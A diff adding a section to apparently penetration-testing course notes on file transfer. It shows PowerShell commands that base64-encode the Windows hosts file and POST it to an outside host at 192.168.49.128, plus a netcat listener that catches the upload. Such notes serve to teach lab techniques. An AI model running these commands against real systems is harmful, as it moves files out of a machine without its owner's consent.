@@ -252,3 +252,12 @@ Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System
 
 ### PowerShell Base64 Web Upload
 Another way to use PowerShell and base64 encoded files for upload operations is by using `Invoke-WebRequest` or `Invoke-RestMethod` together with Netcat. We use Netcat to listen in on a port we specify and send the file as a `POST` request. Finally, we copy the output and use the base64 decode function to convert the base64 string into a file.
+```powershell
+PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
+```
+We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
+```shell
+nc -nvlp 8000
+```
+![](../../Attachements/Pasted%20image%2020260726140230.png)
